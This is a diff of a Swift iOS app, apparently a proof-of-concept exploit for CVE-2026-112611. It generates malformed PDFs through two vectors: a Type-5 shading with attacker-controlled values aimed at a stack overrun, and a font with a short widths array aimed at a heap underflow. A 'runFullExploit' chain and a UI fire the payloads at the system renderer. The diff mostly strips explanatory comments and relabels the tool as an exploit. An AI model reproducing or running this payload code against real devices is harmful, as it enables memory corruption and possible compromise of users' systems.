@@ -2,7 +2,7 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - XPC Stubs (renamed to avoid conflicts)
+// MARK: - XPC Stubs
 
 typealias ExploitXPCConnection = UnsafeMutableRawPointer
 typealias ExploitXPCObject = UnsafeMutableRawPointer
@@ -15,7 +15,6 @@ func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 {
 
 // MARK: - CVE-2026-112611: Dual-Vector Attack
 
-/// Vector 1: Type-5 shading stack VLA overrun
 func triggerShadingVector(controlledValue: UInt64) {
     var values = [Double](repeating: 0.0, count: 136)
     values[3] = Double(bitPattern: controlledValue)
@@ -25,37 +24,19 @@ func triggerShadingVector(controlledValue: UInt64) {
     renderPDF(pdfData)
 }
 
-/// Vector 2: Font widths heap underflow
 func triggerFontVector(widthsCount: Int) {
     let pdfData = PDFPayload.fontWithShortWidths(widthsCount: widthsCount)
     renderPDF(pdfData)
 }
 
-// MARK: - Test Runner
-
-func runTest(vector: String, param: Int) {
-    print("[*] Running \(vector) with param \(param)...")
-    
-    switch vector {
-    case "shading":
-        triggerShadingVector(controlledValue: UInt64(param))
-    case "font":
-        triggerFontVector(widthsCount: param)
-    default:
-        print("[!] Unknown vector: \(vector)")
-    }
-}
-
-// MARK: - Full Exploit Chain
+// MARK: - Full Exploit
 
 func runFullExploit() {
     print("[*] Stage 1: Triggering CVE-2026-112611...")
     
-    // Try font vector first (heap control may be better)
     print("[*] Trying font vector with widths=3...")
     triggerFontVector(widthsCount: 3)
     
-    // Fallback to shading vector
     print("[*] Trying shading vector...")
     triggerShadingVector(controlledValue: 0x4141414141414141)
     
@@ -142,35 +123,30 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var selectedVector = "font"
-    @State private var param = 3
+    @State private var selectedVector = 0
+    @State private var paramText = "3"
     @State private var isRunning = false
     @State private var logOutput = ""
     
-    let vectors = ["shading", "font"]
-    
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611 Dual-Vector")
+            Text("CVE-2026-112611")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Shading + Font Attacks")
+            Text("Dual-Vector Exploit")
                 .font(.headline)
             
-            // Vector selector
             Picker("Vector", selection: $selectedVector) {
-                ForEach(vectors, id: \.self) { vector in
-                    Text(vector.capitalized).tag(vector)
-                }
+                Text("Shading").tag(0)
+                Text("Font").tag(1)
             }
             .pickerStyle(SegmentedPickerStyle())
             .padding(.horizontal)
             
-            // Parameter
             HStack {
                 Text("Param:")
-                TextField("Value", value: $param, format: .number)
+                TextField("Value", text: $paramText)
                     .textFieldStyle(RoundedBorderTextFieldStyle())
                     .keyboardType(.numberPad)
             }
@@ -214,10 +190,16 @@ struct ContentView: View {
     
     func runTest() {
         isRunning = true
-        logOutput = "[*] Starting \(selectedVector) test with param \(param)...\n"
+        let param = Int(paramText) ?? 3
+        
+        logOutput = "[*] Starting test with param \(param)...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runTest(vector: selectedVector, param: param)
+            if selectedVector == 0 {
+                triggerShadingVector(controlledValue: UInt64(param))
+            } else {
+                triggerFontVector(widthsCount: param)
+            }
             
             DispatchQueue.main.async {
                 logOutput += "[*] Test complete (or crashed)\n"
@@ -244,7 +226,6 @@ struct ContentView: View {
 // MARK: - PDF Payload Builder
 
 enum PDFPayload {
-    /// Vector 1: Type-5 shading with controlled values
     static func shadingWithValues(_ values: [Double]) -> Data {
         let bpCoord = 32
         let bpComp = 8
@@ -280,7 +261,6 @@ enum PDFPayload {
         return pdf.data()
     }
     
-    /// Vector 2: Font with short widths array
     static func fontWithShortWidths(widthsCount: Int) -> Data {
         var pdf = ""
         pdf += "%PDF-1.7\n"
@@ -288,7 +268,6 @@ enum PDFPayload {
         pdf += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         pdf += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
         
-        // Malicious font: widths array too short
         var widths = "["
         for i in 0..<widthsCount {
             widths += "\(i + 1)"
